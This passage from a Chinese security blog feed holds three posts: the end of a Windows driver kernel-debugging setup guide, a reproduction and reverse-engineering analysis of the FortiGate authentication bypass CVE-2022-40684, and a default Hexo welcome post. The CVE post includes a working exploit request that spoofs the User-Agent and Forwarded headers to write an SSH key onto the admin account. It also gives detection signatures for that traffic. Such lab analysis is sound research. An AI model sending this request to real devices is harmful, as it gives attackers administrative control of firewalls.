Win 7 虚拟机那边选择启用调试程序</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226190259580.png" class="" title="png"><h3 id="6-2-配置被调试机"><a href="#6-2-配置被调试机" class="headerlink" title="6.2.配置被调试机"></a>6.2.配置被调试机</h3><ul><li>虚拟机的串行端口设置如下（该端是客户端 ，另一端是虚拟机 ），命名管道设置为 <a href="file://./pipe/com_1">\.\pipe\com_1</a></li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226185716228.png" class="" title="png"><ul><li>以管理员身份运行cmd执行<code>bcdedit</code> ,一般只有一个标识为{current}的启动加载器是当前的启动配置</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226185803686.png" class="" title="png"><ul><li>使用如下命令建立一个新的启动项，并且使用bcdedit检查是否copy成功</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bcdedit /copy &#123;current&#125; /d <span class="hljs-string">&quot;Windwos7&quot;</span><br></code></pre></td></tr></table></figure><ul><li>设置新的启动项</li></ul> <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">bcdedit /<span class="hljs-keyword">debug</span> <span class="hljs-keyword">ON</span><br>bcdedit /bootdebug <span class="hljs-keyword">ON</span><br></code></pre></td></tr></table></figure><ul><li>查看当前的调试配置<code>bcdedit /dbgsettings</code>,一般会显示出使用的第一个串口波特率为115200bps</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226185917154.png" class="" title="png"><ul><li>选择菜单的超时，我设置为15秒：  bcdedit &#x2F;timeout 15 </li><li>重新启动，当需要调试时就用调试模式进入</li></ul><h3 id="6-3-驱动调试准备"><a href="#6-3-驱动调试准备" class="headerlink" title="6.3.驱动调试准备"></a>6.3.驱动调试准备</h3><h4 id="6-3-1-断点"><a href="#6-3-1-断点" class="headerlink" title="6.3.1.断点"></a>6.3.1.断点</h4><ul><li><p>32位支持内联asm汇编</p></li><li><p>64位利用在Source文件中直接添加asm文件，直接在asm文件中写汇编代码，然后将asm文件编译为OBJ文件。然后就可以在c++文件中声明asm文件中的函数后直接使用asm文件中用汇编写的函数</p></li><li><p>64位也可使用 DbgBreakPoint(); </p><ul><li>本文使用此方法</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ntddk.h&gt;</span></span><br><span class="hljs-function">VOID <span class="hljs-title">DriverUnload</span><span class="hljs-params">(PDRIVER_OBJECT driver)</span> </span>&#123;<br><span class="hljs-built_in">DbgPrint</span>(<span class="hljs-string">&quot;first:Our driver is unloading\r\n&quot;</span>);<br>&#125;<br><span class="hljs-function">NTSTATUS <span class="hljs-title">DriverEntry</span><span class="hljs-params">(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)</span> </span>&#123;<br><span class="hljs-built_in">DbgBreakPoint</span>();<br><span class="hljs-built_in">DbgPrint</span>(<span class="hljs-string">&quot;first:Our hello my salary\r\n&quot;</span>);<br><br>driver-&gt;DriverUnload = DriverUnload;<br><span class="hljs-keyword">return</span> STATUS_SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h4 id="6-3-2-签名"><a href="#6-3-2-签名" class="headerlink" title="6.3.2.签名"></a>6.3.2.签名</h4><ul><li>win7 x64安装驱动需要签名，这里使用<code>64Signer</code></li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226192152329.png" class="" title="png"><h4 id="6-3-3-调试符号下载与配置"><a href="#6-3-3-调试符号下载与配置" class="headerlink" title="6.3.3.调试符号下载与配置"></a>6.3.3.调试符号下载与配置</h4><ul><li>使用windbg自动下载符号很慢，所以使用windbg目录中存在 symchk.exe 程序，使用如下命令可进行下载</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"> symchk.exe /r c:\windows\system32\ /s SRV*C:\Users\<span class="hljs-built_in">test</span>\Desktop\symblos\*http://msdl.microsoft.com/download/symbols <br><br>- /r c:\windows\system32\ 下载system32下的符号<br>- SRV*C:\Users\<span class="hljs-built_in">test</span>\Desktop\symblos\ 下载符号的保存路径<br>- http://msdl.microsoft.com/download/symbols 微软的符号服务器<br></code></pre></td></tr></table></figure><ul><li>加载被调试驱动的符号</li><li>Windbg-&gt;file-&gt;symbol file path,根据自己的路径填写，本文填写示例如下：</li></ul><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\Users\test\Desktop\code\test\first6\x64\Checked_win7;srv*<span class="hljs-name">C</span>:\Users\test\Desktop\symblos*<span class="hljs-name">http</span>://msdl.microsoft.com/download/symbols<br></code></pre></td></tr></table></figure><ul><li>第一个路径为编译驱动的驱动的符号路径，使用<code>；</code>分割</li></ul><h3 id="6-4-驱动调试"><a href="#6-4-驱动调试" class="headerlink" title="6.4.驱动调试"></a>6.4.驱动调试</h3><ul><li>调试机-打开windbg左上角的 File然后点击Kernel Debug 然后再点击 COM ，设置如下图所示 ，然后点击确定</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226200005753.png" class="" title="png"><ul><li>被调试机启动选择<code>启用调试程序 </code></li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226201250995.png" class="" title="png"><ul><li>被调试机启动驱动</li></ul><img src="/2024/12/29/windows_xp_win7%E9%A9%B1%E5%8A%A8%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/20241226202412267.png" class="" title="png"><h2 id="七-参考链接"><a href="#七-参考链接" class="headerlink" title="七.参考链接"></a>七.参考链接</h2><ul><li><a href="https://www.cnblogs.com/revercc/p/14609685.html">https://www.cnblogs.com/revercc/p/14609685.html</a></li><li><a href="https://bbs.kanxue.com/thread-188471.htm">https://bbs.kanxue.com/thread-188471.htm</a></li><li><a href="https://blog.csdn.net/fonx/article/details/79720490?spm=1001.2101.3001.6650.13&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-13-79720490-blog-104530361.235%5Ev43%5Epc_blog_bottom_relevance_base8&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-13-79720490-blog-104530361.235%5Ev43%5Epc_blog_bottom_relevance_base8&utm_relevant_index=20">https://blog.csdn.net/fonx/article/details/79720490?spm=1001.2101.3001.6650.13&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-13-79720490-blog-104530361.235%5Ev43%5Epc_blog_bottom_relevance_base8&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-13-79720490-blog-104530361.235%5Ev43%5Epc_blog_bottom_relevance_base8&amp;utm_relevant_index=20</a></li><li><a href="https://blog.csdn.net/jmh1996/article/details/88382133">https://blog.csdn.net/jmh1996/article/details/88382133</a></li><li><a href="https://cloud.tencent.com/developer/article/1621329?sid_for_share=99125_3">https://cloud.tencent.com/developer/article/1621329?sid_for_share=99125_3</a></li><li><a href="https://bbs.kanxue.com/thread-261326.htm">https://bbs.kanxue.com/thread-261326.htm</a></li><li><a href="https://bbs.kanxue.com/thread-251052.htm">https://bbs.kanxue.com/thread-251052.htm</a></li><li><a href="https://blog.csdn.net/qq_42931917/article/details/108265848">https://blog.csdn.net/qq_42931917/article/details/108265848</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>window_security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows_drivers</tag>
      
      <tag>windbg</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-40684</title>
    <link href="/2024/01/25/CVE-2022-40684/"/>
    <url>/2024/01/25/CVE-2022-40684/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2022-40684"><a href="#CVE-2022-40684" class="headerlink" title="CVE-2022-40684"></a>CVE-2022-40684</h1><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>Fortinet修复了一个存在 FortiGate 防火墙和 FortiProxy Web 代理中的身份验证绕过漏洞（CVE-2022-40684），该漏洞可能允许攻击者在易受攻击的设备上执行未经授权的操作，攻击者通过向易受攻击的目标发送特制的 HTTP 或 HTTPS 请求进行绕过身份认证以管理员身份在控制面板中执行任意操作。</p><h2 id="二、影响范围"><a href="#二、影响范围" class="headerlink" title="二、影响范围"></a>二、影响范围</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">7</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> &lt;= FortiOS &lt;= <span class="hljs-number">7</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6</span><br><br><span class="hljs-attribute">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span> &lt;= FortiOS &lt;= <span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span><br><br><span class="hljs-attribute">7</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> &lt;= FortiProxy &lt;= <span class="hljs-number">7</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6</span><br><br><span class="hljs-attribute">FortiProxy</span> = <span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><br><span class="hljs-attribute">FortiSwitchManager</span> = <span class="hljs-number">7</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br><br><span class="hljs-attribute">FortiSwitchManager</span> = <span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="三、复现环境"><a href="#三、复现环境" class="headerlink" title="三、复现环境"></a>三、复现环境</h2><ul><li>FortiGate-VM 7.2.1</li></ul><h2 id="四、环境搭建"><a href="#四、环境搭建" class="headerlink" title="四、环境搭建"></a>四、环境搭建</h2><h3 id="4-1-导入虚拟机"><a href="#4-1-导入虚拟机" class="headerlink" title="4.1.导入虚拟机"></a>4.1.导入虚拟机</h3><ul><li>使用vmware打开下载的FortiGate-vm虚拟镜像</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123211511921.png" class="" title="png"><ul><li>接受许可协议</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123211600250.png" class="" title="png"><img src="/2024/01/25/CVE-2022-40684/20240123211649260.png" class="" title="png"><h3 id="4-2-更改虚拟机配置"><a href="#4-2-更改虚拟机配置" class="headerlink" title="4.2.更改虚拟机配置"></a>4.2.更改虚拟机配置</h3><ul><li>给forigate配置ip和网关，打开虚拟机设置</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123211928513.png" class="" title="png"><ul><li>点击编辑，选择虚拟网络编辑器，查看VMnet8的子网IP和网关，这里注意一会在虚拟机里面配置的网关要与之相同。</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123212154008.png" class="" title="png"><h3 id="4-3-配置FortiGate"><a href="#4-3-配置FortiGate" class="headerlink" title="4.3.配置FortiGate"></a>4.3.配置FortiGate</h3><ul><li>打开虚拟机，初始账号admin 提示输入密码直接回车，提示输入新密码</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123212601844.png" class="" title="png"><ul><li>使用如下命令查看接口信息</li></ul><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">show</span> system <span class="hljs-class"><span class="hljs-keyword">interface</span></span><br></code></pre></td></tr></table></figure><img src="/2024/01/25/CVE-2022-40684/20240123212656644.png" class="" title="png"><ul><li>配置ip地址</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">config<span class="hljs-built_in"> system interface</span><br><span class="hljs-built_in"></span><span class="hljs-built_in">edit</span> port1<br><span class="hljs-built_in">set</span> mode static<br><span class="hljs-built_in">set</span><span class="hljs-built_in"> ip </span>192.168.253.55 255.255.255.0<br><span class="hljs-built_in">set</span> allowaccess http<span class="hljs-built_in"> ping </span>ssh<br>end<br><br></code></pre></td></tr></table></figure><img src="/2024/01/25/CVE-2022-40684/20240123212948007.png" class="" title="png"><ul><li>配置网关</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">config router static<br><span class="hljs-built_in">edit</span> 1<br><span class="hljs-built_in">set</span> device port1<br><span class="hljs-built_in">set</span> gateway 192.168.253.2<br>end<br></code></pre></td></tr></table></figure><img src="/2024/01/25/CVE-2022-40684/20240123213208336.png" class="" title="png"><ul><li>尝试ping一下</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123213245810.png" class="" title="png"><h3 id="4-4-登录获取许可证"><a href="#4-4-登录获取许可证" class="headerlink" title="4.4.登录获取许可证"></a>4.4.登录获取许可证</h3><ul><li>打开浏览器输入<code>192.168.253.55</code> 进入登录界面，输入之前设置的账户密码登录</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123213611746.png" class="" title="png"><ul><li>登录后输入账户密码获取许可证</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123210443692.png" class="" title="png">* 等待重启<img src="/2024/01/25/CVE-2022-40684/20240123210530282.png" class="" title="png"><ul><li>点击Later</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123210708933.png" class="" title="png">* 发现正常登录成功<img src="/2024/01/25/CVE-2022-40684/20240123210746990.png" class="" title="png"><h2 id="五、漏洞验证"><a href="#五、漏洞验证" class="headerlink" title="五、漏洞验证"></a>五、漏洞验证</h2><h3 id="5-1-xshell生成密钥"><a href="#5-1-xshell生成密钥" class="headerlink" title="5.1.xshell生成密钥"></a>5.1.xshell生成密钥</h3><img src="/2024/01/25/CVE-2022-40684/20240123225820581.png" class="" title="png"><ul><li>生成公钥</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123225907942.png" class="" title="png"><h3 id="5-2-poc包"><a href="#5-2-poc包" class="headerlink" title="5.2.poc包"></a>5.2.poc包</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">PUT /api/v2/cmdb/<span class="hljs-keyword">system</span>/<span class="hljs-keyword">admin</span>/<span class="hljs-keyword">admin</span> HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span><span class="hljs-number">.253</span><span class="hljs-number">.55</span><br><span class="hljs-keyword">User</span>-Agent: Report Runner<br>Accept-<span class="hljs-keyword">Encoding</span>: gzip, deflate<br><span class="hljs-keyword">Connection</span>: <span class="hljs-keyword">close</span><br>Forwarded:<span class="hljs-keyword">for</span>=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>; <span class="hljs-keyword">by</span>=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>;<br>Content-<span class="hljs-keyword">Type</span>: application/<span class="hljs-type">json</span><br>Content-Length: <span class="hljs-number">411</span><br><br>&#123;&quot;ssh-public-key1&quot;: &quot;\&quot;ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAnVQJuIzvGfdyzx3Q==\&quot;&quot;&#125; //这里为刚才生成的公钥<br><br><br><br></code></pre></td></tr></table></figure><img src="/2024/01/25/CVE-2022-40684/20240123230109427.png" class="" title="png"><h3 id="5-3-使用xshell进行连接"><a href="#5-3-使用xshell进行连接" class="headerlink" title="5.3.使用xshell进行连接"></a>5.3.使用xshell进行连接</h3><img src="/2024/01/25/CVE-2022-40684/20240123225553692.png" class="" title="png"><img src="/2024/01/25/CVE-2022-40684/20240123225646054.png" class="" title="png"><h2 id="六、漏洞分析"><a href="#六、漏洞分析" class="headerlink" title="六、漏洞分析"></a>六、漏洞分析</h2><ul><li>将forigate-vm中的fortios.vmdk复制出来进行分析</li></ul><h3 id="6-1-文件提取"><a href="#6-1-文件提取" class="headerlink" title="6.1.文件提取"></a>6.1.文件提取</h3><ul><li>1.安装libguestfs</li><li>libguestfs 是一组 Linux 下的 C 语言的 API ，用来访问虚拟机的磁盘映像文件。</li></ul><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> libguestfs-tools<br></code></pre></td></tr></table></figure><ul><li><p>2.查看磁盘分区情况</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">sudo virt-<span class="hljs-keyword">file</span><span class="hljs-params">system</span>s -a fortios.vmdk<br></code></pre></td></tr></table></figure></li><li><p>3.挂载</p></li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sudo guestmount -<span class="hljs-selector-tag">a</span> fortios<span class="hljs-selector-class">.vmdk</span> -m /dev/sda1 <span class="hljs-attr">--ro</span> <span class="hljs-built_in">fortios_dir</span>(替换成自己的目标文件夹)<br></code></pre></td></tr></table></figure><ul><li>4.挂载成功后，rootfs.gz为文件系统压缩包</li></ul><img src="/2024/01/25/CVE-2022-40684/20240123233953686.png" class="" title="png"><ul><li>5.解压需要进一步解压rootfs.gz</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> rootfs.gz rootfd<br><span class="hljs-built_in">cd</span> rootfd<br>gunzip rootfs.gz <br>cpio -i 2&gt; /dev/null &lt; rootfs<br><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><img src="/2024/01/25/CVE-2022-40684/20240123234834988.png" class="" title="png"><ul><li><ol start="6"><li><code>bin.tar.xz</code> 文件夹，使用 sbin 目录自带的命令解压</li></ol><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">chroot . /sbin/xz <span class="hljs-attr">--decompress</span> bin<span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.xz</span><br>tar -xvf bin<span class="hljs-selector-class">.tar</span><br><br></code></pre></td></tr></table></figure></li></ul><img src="/2024/01/25/CVE-2022-40684/20240124003234046.png" class="" title="png"><h3 id="6-2-测试漏洞"><a href="#6-2-测试漏洞" class="headerlink" title="6.2.测试漏洞"></a>6.2.测试漏洞</h3><ul><li>进入到bin目录后寻找httpsd程序。httpsd是init程序的软连接，并且这里可以看出init程序非常大，逆向该程序比较费时。所以我们可以根据调试信息先来逆向程序逻辑。</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124003448585.png" class="" title="png"><ul><li>运行以下命令开启httpsd程序的调试信息</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">diagnose <span class="hljs-built_in">debug</span> <span class="hljs-built_in">enable</span><br>diagnose <span class="hljs-built_in">debug</span> application httpsd -1<br>diagnose <span class="hljs-built_in">debug</span> cli 8<br></code></pre></td></tr></table></figure><ul><li>使用poc进行测试，操作的信息会输出到屏幕上：</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124220557790.png" class="" title="png"><img src="/2024/01/25/CVE-2022-40684/20240124220657938.png" class="" title="png"><h3 id="6-3-原理分析"><a href="#6-3-原理分析" class="headerlink" title="6.3.原理分析"></a>6.3.原理分析</h3><ul><li>在IDA pro中打开init程序，搜索字符串fweb_authorize_all进行定位</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124225829156.png" class="" title="png"><ul><li>如上图所示并未找到，我在其他师傅那里看到可以直接识别fweb_authorize_all函数是在ap_hook_check_access_ex中调用的但我的ida并未识别，我是通过搜索上下文字符串反向定位fweb_authorize_all函数，然后搜索ap_hook_check_access_ex发现是一个访问控制函数</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124230405522.png" class="" title="png"><img src="/2024/01/25/CVE-2022-40684/20240124230555262.png" class="" title="png"><ul><li>进入到函数fweb_authorize_all（sub_C4AFB0）中，分析可得，在身份认证过程中，首先判断v2[8]是否等于”127.0.0.1”，即判断是否本机访问。</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124231333037.png" class="" title="png"><ul><li>如果本机访问则sub_C50E80函数内部继续判断接口如果是否为vsys_fgfm接口。<img src="/2024/01/25/CVE-2022-40684/20240124231402283.png" class="" title="png">* 随后取Forwarded头的value值，strstr函数查找"for="的位置，随后执行if结构体内容，再次判断Forwarded_header_content_tmp中是否存在"by"字符，如果判断不通过并不会进入到api_check_access函数中。</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124231735976.png" class="" title="png"><ul><li>从该函数中退出来，继续往上跟踪，发现在地址C4AC70处，先调用了sub_C4B590函数，然后ap_hook_handler hook了sub_C4AC60函数</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124233135960.png" class="" title="png"><ul><li>进入到sub_C4AC60函数</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124233205738.png" class="" title="png"><ul><li>接着往下进入函数sub_C4C480，在进入sub_C4BF20函数</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124233441011.png" class="" title="png"><img src="/2024/01/25/CVE-2022-40684/20240124233519261.png" class="" title="png"><ul><li>sub_C4BF20函数返回了sub_C4BB20函数，进入该函数，发现了调试信息出现的字符fweb_debug_init</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124233624746.png" class="" title="png"><ul><li>重新回到sub_C4C480，分析函数v3[1]函数和sub_C4C2A0，跟进分析一下v3[1]函数，往上看,v3&#x3D;a2,而a2是函数sub_C4C480的参数</li><li></li></ul><img src="/2024/01/25/CVE-2022-40684/20240124233841531.png" class="" title="png"><ul><li>通过交叉引用，发现a2参数为off_3FEA400函数数组的地址<img src="/2024/01/25/CVE-2022-40684/20240124234001439.png" class="" title="png">* 查看此数组</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124234025993.png" class="" title="png"><ul><li>发现从此处会调用一系列hanler函数，这里v3应该对应sub_c929F0函数。查看sub_c929F0函数，函数中调用了api_check_access函数，并且程序会根据api_check_access返回值返回用户对应响应码的reponse。</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124234442983.png" class="" title="png"><ul><li>进入api_check_access函数中进行查看，该函数中无任何输出。</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124234557225.png" class="" title="png"><ul><li>在IDA中搜索api_access_check_for_trusted_access字符，发现api_access_check_for_trusted_access函数中调用sub_C510D0，传入参数为”Node.js”</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124235055698.png" class="" title="png"><ul><li>sub_C510D0函数中判断表单中User-Agent的value值是否与Node.js是否相同，如果不是”Node.js”，则判断User-Agent的value值是否与Report Runner是否相同</li></ul><img src="/2024/01/25/CVE-2022-40684/20240124235808732.png" class="" title="png"><ul><li>进入到以上俩种方式中的某一种，用户赋值为”Local_Process_Access”，此时会绕过身份认证。分析到这里，我们就可以知道要想攻击成功，需要设置Forwarded头value值必须为”for&#x3D;”，后面可以设置127.0.0.1来隐藏防火墙中的攻击记录，而User-Agent的value可以设置”Node.js”和”Report Runner”俩种中的一个。</li></ul><h2 id="七、流量分析"><a href="#七、流量分析" class="headerlink" title="七、流量分析"></a>七、流量分析</h2><ul><li>结合以上分析可得,请求头特征</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">PUT /api/v2/cmdb/<span class="hljs-keyword">system</span>/<span class="hljs-keyword">admin</span>/<span class="hljs-keyword">admin</span> HTTP/<span class="hljs-number">1.1</span><br><span class="hljs-keyword">User</span>-Agent: Report Runner<br><span class="hljs-keyword">User</span>-Agent: Node.js<br>Forwarded:<span class="hljs-keyword">for</span>=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>; <span class="hljs-keyword">by</span>=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>;<br>&#123;&quot;ssh-public-key1&quot;: &quot;\&quot;ssh-rsa AAAAB3NzaC1yc2EQ==\&quot;&quot;&#125;<br><br></code></pre></td></tr></table></figure><ul><li>根据数据包得响应体特征</li></ul><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;cli_error&quot;</span>:<span class="hljs-string">&quot;SSH key is good.</span><br></code></pre></td></tr></table></figure><h2 id="八、-参考链接"><a href="#八、-参考链接" class="headerlink" title="八、 参考链接"></a>八、 参考链接</h2><ul><li><a href="https://blog.csdn.net/We8__/article/details/128306432">https://blog.csdn.net/We8__/article/details/128306432</a></li><li><a href="https://bbs.kanxue.com/thread-275335.htm">https://bbs.kanxue.com/thread-275335.htm</a></li><li><a href="https://zhuanlan.zhihu.com/p/575575181">https://zhuanlan.zhihu.com/p/575575181</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>network_device</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnerability_analysis</tag>
      
      <tag>FortiGate</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/12/26/hello-world/"/>
    <url>/2023/12/26/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo 